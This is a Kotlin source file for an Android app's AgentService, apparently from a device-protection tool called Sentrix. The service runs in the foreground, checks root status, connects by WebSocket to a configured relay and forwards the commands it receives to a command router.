package com.sentrix.agent

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.sentrix.agent.network.WebSocketClient
import com.sentrix.agent.ui.SetupActivity
import com.sentrix.agent.util.Prefs
import com.sentrix.agent.util.RootUtil

/**
 * AgentService — the core of Sentrix.
 *
 * Runs as a foreground service to survive background restrictions.
 * Starts the WebSocket connection and hands off commands to CommandRouter.
 *
 * Lifecycle:
 *  BootReceiver / SetupActivity → startForegroundService(intent)
 *    → onCreate  → builds WebSocket + CommandRouter
 *    → onStartCommand → starts WS connection
 *    → onDestroy → clean disconnect
 */
class AgentService : Service() {

    private val TAG = "AgentService"

    private lateinit var wsClient:      WebSocketClient
    private lateinit var commandRouter: CommandRouter

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")

        // Check and cache root status on start
        Prefs.isRooted = RootUtil.isRooted()
        Log.i(TAG, "Root status: ${Prefs.isRooted}")

        commandRouter = CommandRouter(applicationContext, wsClient = buildWsClient())
    }

    private fun buildWsClient(): WebSocketClient {
        wsClient = WebSocketClient { action, params ->
            commandRouter.dispatch(action, params)
        }
        return wsClient
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, buildNotification())

        if (Prefs.relayUrl.isNotBlank() && Prefs.deviceToken.isNotBlank()) {
            wsClient.connect()
            Log.i(TAG, "WebSocket connecting to ${Prefs.relayUrl}")
        } else {
            Log.w(TAG, "Relay URL or token not configured — waiting for setup")
        }

        // START_STICKY: system will restart the service if killed
        return START_STICKY
    }

    override fun onDestroy() {
        wsClient.disconnect()
        Log.i(TAG, "Service destroyed")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ── Notification ──────────────────────────────────────────────────────────

    private fun buildNotification(): Notification {
        val tapIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, SetupActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, SentrixApp.CHANNEL_SERVICE)
            .setContentTitle("Sentrix")
            .setContentText("Device protection active")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setContentIntent(tapIntent)
            .setOngoing(true)
            .setShowWhen(false)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    companion object {
        private const val NOTIFICATION_ID = 1001
    }
}
